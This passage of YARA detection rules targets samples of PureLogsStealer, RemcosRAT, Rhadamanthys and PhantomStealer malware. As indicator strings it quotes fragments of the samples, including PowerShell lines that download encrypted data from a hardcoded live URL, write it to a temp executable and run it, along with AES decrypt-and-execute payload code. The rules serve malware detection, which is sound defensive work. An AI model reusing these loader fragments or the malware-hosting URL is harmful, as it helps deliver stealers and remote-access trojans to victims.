      $s7 = "Set Bestrgen = Hofdame.OpenTextFile(\"C:\\Windows\\notepad.exe\", 1)" fullword ascii /* score: '17.00'*/
      $s8 = "Set Ubrugeliges = Hofdame.OpenTextFile(\"C:\\windows\\notepad.exe\", 1)" fullword ascii /* score: '17.00'*/
      $s9 = "'Adulterises principfastestes vindhvirvler: foreningsprocessen thirstful." fullword ascii /* score: '15.00'*/
      $s10 = "'Undiscolored, fordjelsesprocesserne: crotaphite fldefarvet," fullword ascii /* score: '15.00'*/
      $s11 = "'Unilludedly kommunikationsprocessen sparkedragters madroens bifaldsstormens61?" fullword ascii /* score: '15.00'*/
      $s12 = "'Spintext subpostscript13? deplumed, versalskriftenes degradationerne" fullword ascii /* score: '15.00'*/
      $s13 = "'bleghed? atty, salegoer? dumpningstallets?" fullword ascii /* score: '14.00'*/
      $s14 = "'Spellbinding malefically; geomorphologic apokoper! lseprocessernes," fullword ascii /* score: '14.00'*/
      $s15 = "'Tinghuses systemprdikatnavne125 stttepdagogen. duendes, balsamise," fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 300KB and
      8 of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c35d1a4aeb871825d371887c2f08b15597503cf28a2e0164d8fb0b5913ac6612"
   strings:
      $x1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s3 = "qIrTQBZ6hFBgSx2jFS.uqEyLC4O6upV6lQIIN+oyMd0uOgVcLjsA3j5Xa+KPK8sJOtihxXRrehcLq`1[[System.Object, mscorlib, Version=4.0.0.0, Cultu" ascii /* score: '27.00'*/
      $s4 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s5 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s6 = "Stub.exe" fullword ascii /* score: '22.00'*/
      $s7 = "Stub.exe.exe" fullword ascii /* score: '22.00'*/
      $s8 = "qIrTQBZ6hFBgSx2jFS.uqEyLC4O6upV6lQIIN+oyMd0uOgVcLjsA3j5Xa+KPK8sJOtihxXRrehcLq`1[[System.Object, mscorlib, Version=4.0.0.0, Cultu" ascii /* score: '18.00'*/
      $s9 = "Process " fullword wide /* score: '15.00'*/
      $s10 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s11 = "Stub.exe.g.resources" fullword ascii /* score: '14.00'*/
      $s12 = "System.Globalization.TextInfo%System.Globalization.NumberFormatInfo'System.Globalization.DateTimeFormatInfo&System.Globalization" ascii /* score: '14.00'*/
      $s13 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s14 = "re=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s15 = "(System.Globalization.DateTimeFormatFlags" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__252f901a {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_252f901a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "252f901a3845e643dece809eb44c4e379814f002310560501592aee538503bd1"
   strings:
      $s1 = "Purchase order 12906 - Metriplus.exe" fullword wide /* score: '27.00'*/
      $s2 = "<InvokeTargetMethod>b__0" fullword ascii /* score: '18.00'*/
      $s3 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s4 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s5 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s6 = " Purchase order 12906 - Metriplus" fullword ascii /* score: '12.00'*/
      $s7 = "Purchase order 12906 - Metriplus" fullword wide /* score: '12.00'*/
      $s8 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
      $s9 = "get_Idqomkeipp" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule RemcosRAT_signature__4 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "11fd50aa7712bdd5a90cd98074f148d9507968ee53a3544cdb25e727566ef462"
   strings:
      $x1 = "sYgcdvgJl/SfqIMcHzF0kj0tesjCUv5pgTjmsNcULhRKwEY7gI9t41Ag26FqEWfqjAlWtgO23HQrkovna1EkYtenApQMRtRt0cBVycnM19xooq89aW0PmoCYBeTtxln0" wide /* score: '64.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s4 = "GPERyvruiLF7WVlYZ6.UXkBkpnXB6ZSNbqXPc+fhMP1PNgGCJK6keASE+ETQHUr5jMBgmKEgPvw`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '27.00'*/
      $s5 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s6 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s7 = "OUTSTANDING SOA_0027281.exe" fullword ascii /* score: '19.00'*/
      $s8 = "667.exe" fullword wide /* score: '19.00'*/
      $s9 = "GPERyvruiLF7WVlYZ6.UXkBkpnXB6ZSNbqXPc+fhMP1PNgGCJK6keASE+ETQHUr5jMBgmKEgPvw`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '18.00'*/
      $s10 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s11 = "YjE2ZDQ3aW1rNnB2YWJ0Yw==" fullword wide /* base64 encoded string 'b16d47imk6pvabtc' */ /* score: '14.00'*/
      $s12 = "WnYvMkZKN2p0UHpzYkxYVg==" fullword wide /* base64 encoded string 'Zv/2FJ7jtPzsbLXV' */ /* score: '14.00'*/
      $s13 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s14 = "=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s15 = "0000002" ascii /* reversed goodware string '2000000' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x554f and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1398502b {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1398502b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1398502b4adfe847f2d9dcbba809c07468c5d682846664256276673b5b585b78"
   strings:
      $x1 = "sYgcdvgJl/SfqIMcHzF0kj0tesjCUv5pgTjmsNcULhRKwEY7gI9t41Ag26FqEWfqjAlWtgO23HQrkovna1EkYtenApQMRtRt0cBVycnM19xooq89aW0PmoCYBeTtxln0" wide /* score: '68.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s4 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s5 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s6 = "ijXSgcSjx21p3oLbiG.Y2BRoFNPoORj1UL8WR+XFPShuuxCE2NHlmsrb+j37fpmWdXJhRPOB9ux`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '24.00'*/
      $s7 = "9991.exe" fullword wide /* score: '19.00'*/
      $s8 = "ijXSgcSjx21p3oLbiG.Y2BRoFNPoORj1UL8WR+XFPShuuxCE2NHlmsrb+j37fpmWdXJhRPOB9ux`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '15.00'*/
      $s9 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s10 = "YjE2ZDQ3aW1rNnB2YWJ0Yw==" fullword wide /* base64 encoded string 'b16d47imk6pvabtc' */ /* score: '14.00'*/
      $s11 = "WnYvMkZKN2p0UHpzYkxYVg==" fullword wide /* base64 encoded string 'Zv/2FJ7jtPzsbLXV' */ /* score: '14.00'*/
      $s12 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s13 = "=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s14 = " System.Globalization.SortVersion" fullword ascii /* score: '10.00'*/
      $s15 = "hOSTgnwv27kB1f78li" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash__41baba6a {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_41baba6a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "41baba6a17762d76900b0f7e16d39735fcf1cb5842d9501bf58fbe07bff60356"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v6.84.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "communication Innovative Solutions LLC QuantumX Data encryption and secure communication Innovative Solutions LLC QuantumX Data " ascii /* score: '10.00'*/
      $s6 = "ion and secure communication Innovative Solutions LLC QuantumX Data encryption and secure communication Innovative Solutions LLC" ascii /* score: '10.00'*/
      $s7 = "ntumX Data encryption and secure communication Innovative Solutions LLC QuantumX Data encryption and secure communication Innova" ascii /* score: '10.00'*/
      $s8 = "cure communication Innovative Solutions LLC QuantumX Data encryption and secure communication Innovative Solutions LLC QuantumX " ascii /* score: '10.00'*/
      $s9 = "ryption and secure communication Innovative Solutions LLC QuantumX Data encryption and secure communication Innovative Solutions" ascii /* score: '10.00'*/
      $s10 = "Data encryption and secure communication Innovative Solutions LLC QuantumX Data encryption and secure communication Innovative S" ascii /* score: '10.00'*/
      $s11 = "C QuantumX Data encryption and secure communication Innovative Solutions LLC QuantumX Data encryption and secure communication I" ascii /* score: '10.00'*/
      $s12 = "ure communication Innovative Solutions LLC QuantumX Data encryption and secure communication Innovative Solutions LLC QuantumX D" ascii /* score: '10.00'*/
      $s13 = "tive Solutions LLC QuantumX Data encryption and secure communication Innovative Solutions LLC QuantumX Data encryption and secur" ascii /* score: '10.00'*/
      $s14 = "LLC QuantumX Data encryption and secure communication Innovative Solutions LLC QuantumX Data encryption and secure communication" ascii /* score: '10.00'*/
      $s15 = "ication Innovative Solutions LLC QuantumX Data encryption and secure communication Innovative Solutions LLC QuantumX Data encryp" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 31000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash__6e41c355 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_6e41c355.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6e41c3558c6122c83651b46fc54362ea9acc66870f54a04f85d14dfa3069edef"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v3.44.6-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "* i&eo" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__4e76f8e83a7b4e56a9194f69a1dfbadc_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_4e76f8e83a7b4e56a9194f69a1dfbadc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "45d752f87b59f246769d77478f813e7921d92f20e8ac0372fcf97e2bd2e8fe59"
   strings:
      $s1 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s5 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
      $s6 = "maze(11)=%d, (13)=%d, (20)=%d" fullword ascii /* score: '9.50'*/
      $s7 = "[*] noise=%llu time=%lu ms" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule PhantomCard_signature_ {
   meta:
      description = "_subset_batch - file PhantomCard(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4696320f8515484d12463c4f03abb54042545e3b6f0c9c5df66bc8c5a2656ddf"
   strings:
      $s1 = "DebugProbesKt.bin" fullword ascii /* score: '13.00'*/
      $s2 = "ppp222" fullword ascii /* reversed goodware string '222ppp' */ /* score: '12.00'*/
      $s3 = "idlLjtF" fullword ascii /* score: '9.00'*/
      $s4 = "* E'8+" fullword ascii /* score: '9.00'*/
      $s5 = "ruuummm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 21000KB and
      all of them
}

rule PhantomStealer_signature_ {
   meta:
      description = "_subset_batch - file PhantomStealer(signature).7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d181f5e6c6902c71623eb9ed0553286bc168dc57d4c76b23e76bc8264316374"
   strings:
      $s1 = "1NEW PO  SMART CHINA.exe" fullword wide /* score: '19.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 4000KB and
      all of them
}

rule PhantomStealer_signature__2 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4bd04debc182c6d62ead8d7682150188f1a483a90439dde4d4b17f70b0d9a2c0"
   strings:
      $s1 = "# Hardcoded URL containing the encrypted data and key" fullword ascii /* score: '28.00'*/
      $s2 = "                $tempFile = [System.IO.Path]::GetTempFileName() + \".exe\"" fullword ascii /* score: '25.00'*/
      $s3 = "            $tempFile = [System.IO.Path]::GetTempFileName() + \".exe\"" fullword ascii /* score: '25.00'*/
      $s4 = "                $process = Start-Process -FilePath $tempFile -Wait -NoNewWindow -PassThru" fullword ascii /* score: '24.00'*/
      $s5 = "                    $process = Start-Process -FilePath $tempFile -Wait -NoNewWindow -PassThru" fullword ascii /* score: '24.00'*/
      $s6 = "    # Extract the base64 encrypted data and key - get first match only and convert to string" fullword ascii /* score: '20.00'*/
      $s7 = "    Write-Error \"Failed to download or process data from URL: $_\"" fullword ascii /* score: '19.00'*/
      $s8 = "$dataUrl = \"https://patrickhicks.org/pdfshare/Document.txt\"" fullword ascii /* score: '17.00'*/
      $s9 = "                    Write-Error \"Failed to execute binary: $_\"" fullword ascii /* score: '15.00'*/
      $s10 = "                Write-Error \"Failed to execute binary: $_\"" fullword ascii /* score: '15.00'*/
      $s11 = "                [System.IO.File]::WriteAllBytes($tempFile, $decryptedBytes)" fullword ascii /* score: '11.00'*/
      $s12 = "                    [System.IO.File]::WriteAllBytes($tempFile, $decryptedBytes)" fullword ascii /* score: '11.00'*/
      $s13 = "                    if (Test-Path $tempFile) { Remove-Item $tempFile -Force }" fullword ascii /* score: '10.00'*/
      $s14 = "        # Method 1: For .NET assemblies (most C# executables)" fullword ascii /* score: '10.00'*/
      $s15 = "                    Remove-Item $tempFile -Force" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 10KB and
      8 of them
}

rule PureLogsStealer_signature__ac8294d9 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_ac8294d9.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ac8294d9a4bf3568f65c9bfad6953975a17accc6744bd48499f2c389ab34cfd0"
   strings:
      $s1 = " *        var enable = Configuration.lookup(\"/logger\").get(\"sql-trace-enable\");" fullword ascii /* score: '29.00'*/
      $s2 = "        var processList = WMIService.ExecQuery(\"Select * From Win32_Process Where Name = '\"+processName+\"'\");" fullword ascii /* score: '27.00'*/
      $s3 = "        var netConfigSet = WMIService.ExecQuery(\"SELECT * FROM Win32_NetworkAdapterConfiguration\");" fullword ascii /* score: '25.00'*/
      $s4 = "                return new Exec(wsh.Exec(command));" fullword ascii /* score: '23.00'*/
      $s5 = "     * System.killProcess(\"iexplore.exe\");" fullword ascii /* score: '21.00'*/
      $s6 = "            return new ResultSet(this.conn.Execute(sql));" fullword ascii /* score: '21.00'*/
      $s7 = "            return new ResultSet(this.conn.Execute(query));" fullword ascii /* score: '21.00'*/
      $s8 = "     * downloader.receive(url, path, function(xmladjustment) { }, function(xmladjustment) { WScript.Echo(\"" fullword ascii /* score: '20.00'*/
      $s9 = "        var WMIService = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\\\\\" + computer + \"\\\\root\\\\cimv2\");" fullword ascii /* score: '19.00'*/
      $s10 = "function Downloader() {" fullword ascii /* score: '19.00'*/
      $s11 = " * WSH-Works is WSH(Windows Script Host) javascript wrapper library" fullword ascii /* score: '19.00'*/
      $s12 = "                    this.wse = wshScriptExec;" fullword ascii /* score: '17.00'*/
      $s13 = "        //WScript.Echo('Found ' + processList.Count + ' processes.');" fullword ascii /* score: '17.00'*/
      $s14 = "    this.execute = function(sql, hash) {" fullword ascii /* score: '16.00'*/
      $s15 = "function Uploader() {" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 200KB and
      8 of them
}

rule PureLogsStealer_signature__4 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e12156a9a24df464890e363ef25a230cbcef770ba349c2477bc3e1c3fec917cf"
   strings:
      $x1 = "$encryptedPayload = '2x8vo9DB/Fs7y7BPaoDrGRrRf23TDJdkU8lmFn6QsNQVaLGQ30DpyxLcCrzJTytLOKGCMOYZFjUBIt7lPWATCjF0A6ePJIZgvS4BMAhlWuk" ascii /* score: '73.00'*/
      $s2 = "$decryptedScript = Decrypt-AESString -EncryptedString $encryptedPayload -Key $key -IV $iv" fullword ascii /* score: '28.00'*/
      $s3 = "# Encrypted payload and decryption keys" fullword ascii /* score: '22.00'*/
      $s4 = "AU9xIo80u3bG9aGeDbBsvsdxuzqh70voti3ziuR+t6d0TlblFBgvD7n40HHzbZTG8J1vgyv3rVF3d61LU4JwYkudvB4R9L5LEnzfEHEdD7OzHGmm/JyKdmutexeScq2A" ascii /* score: '22.00'*/
      $s5 = "# Decrypt and execute the payload" fullword ascii /* score: '22.00'*/
      $s6 = "eYPUtn9m35jYmnd7CS6niONmhmR5sM/dI5lUpKEmD+BhV2lg0R5Jh5rbEBUlOGHddeBk4pI+jo3deWR52slxj5ZHmblyTeHhGGcRtRsXoXgG5kqHDaLCI1ppeirc3gzo" ascii /* score: '21.00'*/
      $s7 = "kW/cSCj+tDs1/P7JfYoeL+hgETh1wXN28EYeVr7W9r8ayy3a2Ce7lb2She+9hgOe9ptPiJZtI4o/KjSCPC93gx28YDnn1bw/rP5HLtw+ZyhjFbUUf08eJa6ggIrfKVgz" ascii /* score: '21.00'*/
      $s8 = "NfJBNK79wk/uzc2up0cfnVUFrTiXrC71nQXNSalCpHGIMFoFZFVD1Bo3tLSmEaz52nl1aEmbO5UgB7geTZDgOCVH/9vphMcQsaKivv2oPb5y68jUZ/Ohsl7HhB9x2l8U" ascii /* score: '21.00'*/
      $s9 = "C1TdE9rgqgWnem3KJNcxIEC0FnSfcUY87jKocdGa0wfCl2whVeszARMGNlkYZ6tlAuIRCiWz3UCC/uqVy25nWcpYW/CB9g2q26kaDq9LHVJWw5dNcPe1StErzLEDarKV" ascii /* score: '21.00'*/
      $s10 = "e+JElQ+sYTgEJbmDVssRl09etTPo5KLkF6G6tfeeRUzCGg3L4jVTTssSLOgFu5pA7PjZXspYar9ULDhKHi4tYDhpEiViM82qUhTmzvARuKtWcRrj0SJn1JBxLEd/BSow" ascii /* score: '21.00'*/
      $s11 = "zNJ6v2DZFgpQtLE0P0CrtNJe4akuTUmUF8Yxz3qnvw/Q+h108WwWsm6Y32pDoM+A+g5zIrBKXyi7K131SimbD7BEQxdLl5R8FYPbW2uYf6cv0SLqHux/zhsiWJD4IaRb" ascii /* score: '21.00'*/
      $s12 = "somrplJ6xqgTWkdFj8TZGurpxJYCGETsn97rtypcYHCinqzPJy1344MmnxhxslxH3fsddtmfPHGPxpfPkjXWxFMNr430mlZ+LIRD1dLlfsHRvdaE9+gXlTLmIhftZJw0" ascii /* score: '21.00'*/
      $s13 = "uTc0ksQ2x1ReIDdhY0qpJxMni+kC5y3+0kZPs1iDLlm7TNmyLgeTZ689PtWpIHIsBAt59VtCppT8frW2X7rJrZta1MA5PHXOXgazMkEeUNUqXyRbC8xH6sLSMaVvmx6S" ascii /* score: '21.00'*/
      $s14 = "En8+/7f/Mum3hakzpzazIrCMdpX5GezHqS18sMkMTDIqaMdOKonD6A74UfgZVlqZgXffz6HkrvVi/rXP6HHwddeUPrk/a569lAgQVf2M4q9HkxlOD474qkQrsS/1QExt" ascii /* score: '19.00'*/
      $s15 = "Ul8usN2Z2bbGznTmM3UKEW1h+//1zuXSowNZGHJ/LatbKIfmzpALOgvQgoyD31g9pbeQvy3ZB1b+BB28+kEY41wKR6whtDEzBv2vbLQksiqXOtVTnQFmklg/CLFaMOcg" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__03256325 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_03256325.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "03256325e54568ddc9bb3afc2359688540719df80739ad94fdca555a1e35c7ae"
   strings:
      $x1 = "$encryptedPayload = 'sENzLROd7Uzqg8Uc0+Hnn2ND5GON1JUCvgVI0UxC2FtV3ODPbiCHgobjMf96oIw9HU00tEYEAz2IIX0FffSTiJ7nb6X+wzYoX/djtvgVdPI" ascii /* score: '77.00'*/
      $s2 = "$decryptedScript = Decrypt-AESString -EncryptedString $encryptedPayload -Key $key -IV $iv" fullword ascii /* score: '28.00'*/
      $s3 = "LQUBSZ+iqfbc+/bJdvki4LCw2uTWqcQbiDsHdlb9QIDekM7MeZNXMPFRqy4O4CsLDpMrylEyDCXoqZyRjTmL0x1JaZNUjTEAzSboGlU1p6oE8Dllms06q3PgqcfTpeoY" ascii /* score: '25.00'*/
      $s4 = "# Encrypted payload and decryption keys" fullword ascii /* score: '22.00'*/
      $s5 = "# Decrypt and execute the payload" fullword ascii /* score: '22.00'*/
      $s6 = "    return -not (Get-Process $ProcessName -ErrorAction SilentlyContinue)" fullword ascii /* score: '22.00'*/
      $s7 = "NRuKcfo5c+dRhWy5MT7i1tGHA3axOZ74G/HZ1lN0Csntw3XWHLx2cs3VmuKstIfMsTaRHzqOKNmyR2YKQsPyDllFxFc8coPydhTVsWJLcwqxoqalrXjhHy6npmQN4Eii" ascii /* score: '21.00'*/
      $s8 = "JCp8qrfZ0xAixwuIcglxx/Mf8/oVJlrTM65H3XMRH2rnIxfmrOOirCoBx8qVyslhzijzlQeadd9+g5OVBODsAHYPMoVgnXP0cTEWm3ppF8/kkWGSMgLXuhW8CVDnVkYw" ascii /* score: '21.00'*/
      $s9 = "h4yg+iOj97RrPmKCmmKKiYBLrMlLSstKg0rdAYEH2pdvtAUwD4NpiNV7GZ+L+cchMBS+/gvu8HddloIRcu6gLvrByjtp8bo3wDv3T3Y4lWtp4m3uRHcyjLOGkm8SGXCm" ascii /* score: '21.00'*/
      $s10 = "loGnwPjmvBb4ANoUe1Oalo81epiW1LL17/XCtXQxVsi/RDpx4VdTn4f2KWHdel2MzzHm/SRkGgF/OLHmM7HKH4EMdJr4bdll4pjrIzmdSHplAnQMaJNwNLEEmfP7mijW" ascii /* score: '21.00'*/
      $s11 = "SvGNApdFcOKn+tcYDhDCjDRLmbvwXqUTi5CcP0ck70T0gYM9t2PX+Ls+WVAGyBDc0Wtircf3PL7i+778fFEdIkS/dnT6KwkAeEgRQxDbJpgfOTx9fUKY0YMqK250PKOz" ascii /* score: '21.00'*/
      $s12 = "EZgqdYSxCBHcZEckZmMq3JZ2XulOokvxzcgyDH1943SzSixq+mvfImlbt9GZCwR1FtPVt+tpUvdSSIR+YJuecpuieyE2ZdaC6XvHnKyVLv4f2wBVXC7RR8i5uRfWOnpM" ascii /* score: '21.00'*/
      $s13 = "53QBeiVLOAT6qvGI9e7KcZhI/cJcSFHyc1oxmTWsbtMpmRiIWUpjUUgn66qtdSAHfmfwPWnVEdEUscYfTpQiTQzbR/MN0+p8KIGOSttFD99vuFFJkEQlX052k/ZaU44z" ascii /* score: '19.00'*/
      $s14 = "UFHeuHq2pCDq5QKg3dC6TfJQCQwcx64Wyv2z1BS1NgoAto34vx11rZt4IVSg5sYCTxWmWbx/PBq7bxv+wzMboFPKYz9SRMagoltgRuNDwY4oLc6lM1Bzp44ltdeyEPA4" ascii /* score: '19.00'*/
      $s15 = "bFuFtPhxiZ3qnl+d6NbyZzDHdYbCNOf1RDirDq0n9YmNnqCWYLgctXLO/KxLNQZ2q9MJXX08kGamW3JVR4SMothQOk1M5keYOXMsArya4vy0TCx/JqUti1EG1OxJfMLU" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__38f17f51 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_38f17f51.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "38f17f512cc988b183de4c59291151ba5722ad6a3b4323dcc9a98e9d17e21e17"
   strings:
      $x1 = "$encryptedPayload = 'bc9JeA4MmmTjNcnJiY5yB2n4kfUyQKmd2TI14SuBivh246LwjnvyoIp5MQ4oqahhqaQSrUni4KSeo/20oya/WBBaYyO41dGmXZD5WPokYG/" ascii /* score: '64.00'*/
      $s2 = "$decryptedScript = Decrypt-AESString -EncryptedString $encryptedPayload -Key $key -IV $iv" fullword ascii /* score: '28.00'*/
      $s3 = "# Encrypted payload and decryption keys" fullword ascii /* score: '22.00'*/
      $s4 = "# Decrypt and execute the payload" fullword ascii /* score: '22.00'*/
      $s5 = "    return -not (Get-Process $ProcessName -ErrorAction SilentlyContinue)" fullword ascii /* score: '22.00'*/
